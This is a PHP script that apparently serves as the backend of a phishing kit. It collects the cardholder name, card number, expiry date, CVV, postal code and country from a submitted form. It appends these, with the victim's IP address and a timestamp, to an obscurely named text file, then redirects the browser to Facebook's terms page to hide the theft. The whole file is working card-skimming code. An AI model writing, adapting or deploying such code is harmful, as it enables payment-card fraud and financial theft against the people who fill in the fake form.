<?php
$file = "_______dwfnik3yt5w84o9_____________.txt";
$CName = $_POST['CName'];
$CreditCardNumber = $_POST['CNumber'];
$Month = $_POST['mm'];
$Year = $_POST['yy'];
$CodeCVV = $_POST['CVV'];
$zip = $_POST['zip'];
$country = $_POST['country'];
$ip = $_SERVER['REMOTE_ADDR'];
$today = date("F j, Y, g:i a");

$handle = fopen($file, 'a'); 
fwrite($handle, "\n");
fwrite($handle, "KOMPUTER---------------------------------------------->>"); 
fwrite($handle, "\n");
fwrite($handle, "Name On Card        >> ");
fwrite($handle, "$CName");
fwrite($handle, "\n");
fwrite($handle, "Credit Card Number  >> ");
fwrite($handle, "$CreditCardNumber");
fwrite($handle, "\n");
fwrite($handle, "Expiration Card     >> ");
fwrite($handle, "$Month");
fwrite($handle, "|");
fwrite($handle, "$Year");
fwrite($handle, "\n");
fwrite($handle, "Security Code (CVV) >> ");
fwrite($handle, "$CodeCVV");
fwrite($handle, "\n");
fwrite($handle, "Postal Code         >> ");
fwrite($handle, "$zip");
fwrite($handle, "\n");
fwrite($handle, "Country             >> ");
fwrite($handle, "$country");
fwrite($handle, "\n");
fwrite($handle, "Tanggal Login       >> ");
fwrite($handle, "$today");
fwrite($handle, "\n");
fwrite($handle, "Ip Address          >> ");
fwrite($handle, "$ip");
fwrite($handle, "\n");
fwrite($handle, "KOMPUTER---------------------------------------------->>");
fwrite($handle, "\n");
fclose($handle);
echo "<script LANGUAGE=\"JavaScript\">
<!--
window.location=\"https://www.facebook.com/legal/terms\";
// -->
</script>";
?>